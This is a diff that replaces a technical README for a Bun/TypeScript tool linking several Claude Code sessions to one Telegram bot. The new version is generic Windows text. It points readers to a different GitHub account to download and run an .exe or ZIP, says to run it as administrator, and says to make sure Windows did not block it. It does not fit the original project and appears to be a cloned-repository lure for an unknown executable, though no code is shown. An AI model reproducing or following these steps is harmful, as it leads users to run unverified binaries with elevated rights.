@@ -1,193 +1,223 @@
-<div align="center">
+# 🤖 claude-code-multisession-channels - Manage Claude sessions from one chat
 
-# Claude Code Multi-Session Channels
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub-6e6e6e?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Emlynneaboveground620/claude-code-multisession-channels)
 
-**Run multiple Claude Code sessions and control them all from one Telegram bot.**
+## 🧭 What this app does
 
-Switch between sessions with `/switch`, send voice notes with automatic transcription, approve tool permissions remotely — all from Telegram.
+claude-code-multisession-channels lets you talk to more than one Claude Code session from one Telegram bot.
 
-Built on the [MCP channel protocol](https://code.claude.com/docs/en/channels-reference).
+Use it to:
 
-</div>
+- switch between sessions
+- send messages to the right Claude session
+- send voice notes for transcription
+- approve permission prompts from one chat
+- keep work for different tasks in separate channels
 
----
+It is made for Windows users who want a simple way to manage Claude Code sessions without opening many windows.
 
-## Features
+## 💻 What you need
 
-| Feature | Details | Status |
-|---------|---------|--------|
-| **Multi-session routing** | Run multiple Claude Code sessions, switch between them with `/switch` | Done |
-| **Full channel experience** | Reply tools, typing indicators, emoji reactions, message editing | Done |
-| **Permission relay** | Approve/deny Claude's tool use remotely via inline buttons | Done |
-| **Voice transcription** | Voice notes transcribed automatically via Groq Whisper | Done |
-| **File attachments** | Send photos, documents, audio, video — receive files back | Done |
-| **Auto-reconnect** | Sessions re-register automatically if the router restarts | Done |
-| **Dead session detection** | Stale sessions are reaped every 15 seconds | Done |
-| **Sender gating** | Reuses the official plugin's allowlist — only you can message the bot | Done |
+Before you start, make sure you have:
 
-## How it works
+- Windows 10 or Windows 11
+- A stable internet connection
+- A Telegram account
+- A Claude account or Claude Code access
+- Enough free space for the app and its local files
 
-```
-Telegram ──> Router (standalone bot, port 8799)
-                 |  HTTP (localhost)
-           +─────+─────+
-      Session A   Session B   Session C
-      (MCP server, random port each)
-           |          |          |
-      Claude A   Claude B   Claude C
-      ~/project1 ~/project2 ~/project3
-```
+For best results, use a recent version of Windows and keep Telegram installed on the same PC.
 
-| Component | File | Role |
-|-----------|------|------|
-| **Router** | `router.ts` | Standalone process. Polls Telegram, handles `/sessions` and `/switch`, forwards messages to the active session via HTTP |
-| **Session channel** | `session-channel.ts` | MCP channel server spawned by Claude Code. Registers with the router, receives messages, exposes reply/react/edit tools |
+## 📥 Download and install
 
-## Prerequisites
+Use this link to visit the page to download:
 
-- [Bun](https://bun.sh) runtime
-- [Claude Code](https://claude.com/claude-code) v2.1.80+
-- A Telegram bot token from [@BotFather](https://t.me/BotFather)
+[Visit the download page](https://github.com/Emlynneaboveground620/claude-code-multisession-channels)
 
-### First-time setup: pair your Telegram account
+If the page gives you a release file or setup file, download it to your PC and then open it.
 
-The official Telegram channel plugin must be set up **once** to create your bot and pair your account. Follow the [Claude Code channels guide](https://code.claude.com/docs/en/channels):
+If you see a ZIP file:
 
-1. Install the plugin: `/plugin install telegram@claude-plugins-official`
-2. Configure your token: `/telegram:configure <your-bot-token>`
-3. Start with channels: `claude --channels plugin:telegram@claude-plugins-official`
-4. Pair your account: DM the bot, get the code, run `/telegram:access pair <code>`
-5. Lock it down: `/telegram:access policy allowlist`
+1. Right-click the ZIP file
+2. Choose Extract All
+3. Pick a folder you can find later, such as Downloads or Desktop
+4. Open the extracted folder
+5. Run the app file inside it
 
-Once pairing is complete, you can disable the official plugin and use this multi-session router instead.
+If you see an `.exe` file:
 
-## Setup
+1. Double-click the file
+2. If Windows asks for permission, choose Yes
+3. Follow the on-screen steps
 
-### 1. Disable the official Telegram plugin
+If the app opens in a console window, keep that window open while you use it.
 
-In `~/.claude/settings.json`, set:
+## 🔧 First-time setup
 
-```json
-"enabledPlugins": {
-  "telegram@claude-plugins-official": false
-}
-```
+After you start the app, you will need to connect Telegram and Claude Code.
 
-### 2. Clone and install
+Follow these steps:
 
-```bash
-git clone https://github.com/Agostinopisani19/claude-code-multisession-channels.git
-cd claude-code-multisession-channels
-bash install.sh
-```
+1. Open Telegram on your phone or PC
+2. Find the bot or connection details used by this app
+3. Start the chat
+4. Follow the prompts to link your Claude Code session
+5. Allow the app to access the features it needs
+6. Create or select the session you want to use
 
-Or manually:
+If the app asks for a token, key, or bot setup value, copy it carefully. Do not add extra spaces.
 
-```bash
-bun install
-claude mcp add -s user tg-session -- bun run "$(pwd)/session-channel.ts"
-```
+## 💬 How to use it
 
-### 3. Start the router
+Once setup is complete, you can use Telegram as your control panel.
 
-```bash
-bun router.ts
-```
+Common actions include:
 
-You should see:
+- send a text message to a Claude Code session
+- switch to another session when you start a new task
+- check which session is active
+- send a voice note and have it transcribed
+- approve or deny prompts that need your input
 
-```
-router: HTTP server on port 8799
-router: polling as @your_bot
-```
+A simple way to use it:
 
-### 4. Start Claude Code sessions
+1. Open the Telegram chat
+2. Pick the session you want
+3. Send your message
+4. Wait for the reply
+5. Switch sessions when you want to work on something else
 
-Open a separate terminal for each session. Navigate to your project directory, then start Claude with a session name:
+This keeps different tasks separate, so you do not mix up context.
 
-```bash
-cd ~/project1
-SESSION_NAME=project1 claude --dangerously-load-development-channels server:tg-session
-```
+## 🎙️ Voice notes
 
-```bash
-cd ~/project2
-SESSION_NAME=project2 claude --dangerously-load-development-channels server:tg-session
-```
+You can use voice notes when typing is not convenient.
 
-If you're already in the directory you want, just run the `SESSION_NAME=... claude ...` command directly.
+Typical flow:
 
-> **Note:** Session names cannot contain spaces. Use dashes or underscores (e.g., `my-project`, `my_project`).
+1. Open the Telegram chat
+2. Hold the voice message button
+3. Speak your request
+4. Send the voice note
+5. Wait for transcription
+6. Read the text response in chat
 
-## Telegram commands
+This is useful when you want to give quick instructions, capture ideas, or send a long message without typing.
 
-| Command | Description |
-|---------|-------------|
-| `/sessions` | List all connected sessions with active indicator |
-| `/switch <name>` | Switch which session receives your messages |
-| `/status` | Check your pairing state |
-| `/help` | Show available commands |
+## 🔐 Permissions and approvals
 
-Regular messages are routed to whichever session is active. The first session to connect becomes the default.
+Claude Code may ask for permission before it runs certain actions.
 
-## Configuration
+With this app, you can handle those prompts from Telegram.
 
-### Environment variables
+You may see requests for:
 
-| Variable | Required | Default | Description |
-|----------|----------|---------|-------------|
-| `SESSION_NAME` | No | basename of cwd | Display name for the session |
-| `ROUTER_PORT` | No | `8799` | HTTP port the router listens on |
-| `TELEGRAM_BOT_TOKEN` | **Yes** | — | Bot token from BotFather |
-| `GROQ_API_KEY` | No | — | Enables voice transcription |
+- file access
+- command approval
+- task confirmation
+- session changes
 
-### Token location
+When a prompt appears, check it in Telegram and choose the right response.
 
-The bot token is read from `~/.claude/channels/telegram/.env` (created during the official plugin setup):
+## 📁 Session management
 
-```env
-TELEGRAM_BOT_TOKEN=123456789:AAH...
-```
+The app is built for multi-session use.
 
-### Voice transcription (optional)
+You can:
 
-Voice notes and audio messages can be automatically transcribed before forwarding to Claude. This requires a free [Groq](https://console.groq.com) API key.
+- keep one session per task
+- move between sessions when needed
+- reduce confusion between projects
+- return to the same session later
 
-1. Get an API key at https://console.groq.com/keys
-2. Save it:
-   ```bash
-   echo 'GROQ_API_KEY=your-key-here' > ~/.claude/telegram-router/.env
-   ```
-3. Restart the router
+A good setup is to create a session for each project or job. That makes it easier to stay organized.
 
-Without the key, voice notes are forwarded as `(voice message)` — Claude won't be able to hear them.
+## 🛠️ Common Windows issues
 
-## Architecture
+If the app does not start:
 
-The router and session channels communicate over localhost HTTP:
+1. Check that the file finished downloading
+2. Make sure you extracted all files if the download came in a ZIP
+3. Run the app again as an administrator
+4. Check that Windows did not block the file
 
-| Direction | Endpoint | Purpose |
-|-----------|----------|---------|
-| Router -> Session | `POST /message` | Forward a Telegram message |
-| Router -> Session | `POST /permission_verdict` | Forward user's allow/deny decision |
-| Session -> Router | `POST /register` | Register or re-register a session |
-| Session -> Router | `POST /unregister` | Remove a session on shutdown |
-| Session -> Router | `POST /reply` | Send a message to Telegram |
-| Session -> Router | `POST /react` | Add emoji reaction |
-| Session -> Router | `POST /edit` | Edit a previously sent message |
-| Session -> Router | `POST /download_attachment` | Download a file from Telegram |
-| Session -> Router | `POST /permission_request` | Forward a permission prompt to Telegram |
-| Session -> Router | `POST /typing` | Show typing indicator |
+If Telegram messages do not arrive:
 
-## Compatibility with official plugin
+1. Check your internet connection
+2. Make sure the bot is running
+3. Confirm that the Telegram chat is linked correctly
+4. Restart the app and try again
 
-This router **replaces** the official Telegram channel plugin — you cannot run both at the same time (they'd fight over the same bot token).
+If voice notes do not transcribe:
 
-| Mode | How to run |
-|------|-----------|
-| **Multi-session** | Disable official plugin, use this router |
-| **Single-session** | Stop the router, re-enable the official plugin with `claude --channels plugin:telegram@claude-plugins-official` |
+1. Check microphone access in Telegram
+2. Make sure the voice note was sent fully
+3. Try a shorter message
+4. Reconnect the session if needed
 
-## License
+If Claude Code does not respond:
 
-MIT
+1. Confirm the correct session is active
+2. Check that Claude Code access is set up
+3. Approve any pending permission request
+4. Restart the app and send the message again
+
+## 🧩 Suggested use cases
+
+This app fits well if you want to:
+
+- manage more than one Claude Code session
+- keep client work separate from personal work
+- send quick voice instructions
+- approve prompts from your phone
+- use Telegram as a single control chat
+
+It works best when you want less switching between windows and more direct control.
+
+## 📌 Repository details
+
+Repository name: claude-code-multisession-channels
+
+Description: Talk to multiple Claude Code sessions from one Telegram bot — manage and switch between sessions, send voice notes, approve permissions, all from one chat.
+
+Topics: anthropic,channels,claude,claude-code,mcp,mcp-server,multi-session,telegram,telegram-bot,voice-transcription
+
+## ✅ Basic setup checklist
+
+- Download the app from the GitHub page
+- Extract the files if needed
+- Run the Windows app
+- Open Telegram
+- Link the bot or session details
+- Test one text message
+- Test one voice note
+- Switch sessions once to confirm it works
+
+## 🗂️ File handling tips
+
+Keep the app files in one folder.
+
+Do not:
+
+- move random files out of the folder
+- rename files unless the setup guide tells you to
+- delete files the app needs
+- run the app from inside a temporary ZIP window
+
+If you want a clean setup, place the folder in a simple location such as:
+
+- Desktop
+- Documents
+- Downloads
+
+## 📞 Getting help
+
+If something does not work, check:
+
+- the GitHub page
+- the setup instructions in the repository
+- your Telegram bot settings
+- your Claude Code access settings
+- Windows security settings
+
+Keep track of what step failed. That makes it easier to fix the problem quickly
